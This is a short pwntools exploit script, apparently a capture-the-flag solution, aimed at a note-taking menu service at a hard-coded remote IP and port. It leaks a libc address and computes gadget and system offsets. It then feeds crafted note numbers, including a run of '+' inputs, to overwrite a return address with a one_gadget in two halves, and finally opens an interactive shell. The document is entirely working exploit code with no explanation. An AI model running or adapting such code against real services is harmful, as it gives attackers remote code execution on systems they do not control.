from pwn import *

io=remote('183.129.189.60',10028)

io.sendline('66')
io.recvuntil('my id:')
idd=u64(io.recv(6).ljust(8,'\x00'))
print(hex(idd))
libc_base=idd-0x06f690
print(hex(libc_base))
one_gadget=libc_base+0x45216
print(hex(one_gadget))
pop_rdi=libc_base+0x21102
sh=libc_base+0x18cd57
sys=libc_base+0x045390
ret=libc_base+0x0937
#io.sendline('3')



for i in range(25):
    print(i)
    io.recvuntil('>')  
    io.sendline('1')
    io.recvuntil('note number')
    io.sendline('0')


#pause()

#pause()
for i in range(5):
    print(i)
    io.recvuntil('>')  
    io.sendline('1')
    io.recvuntil('note number')
    io.sendline('+')

io.recvuntil('>')  
io.sendline('1')
io.recvuntil('note number')
io.sendline(str(one_gadget&0xffffffff))

io.recvuntil('>')  
io.sendline('1')
io.recvuntil('note number')
io.sendline(str(one_gadget>>32))


io.interactive()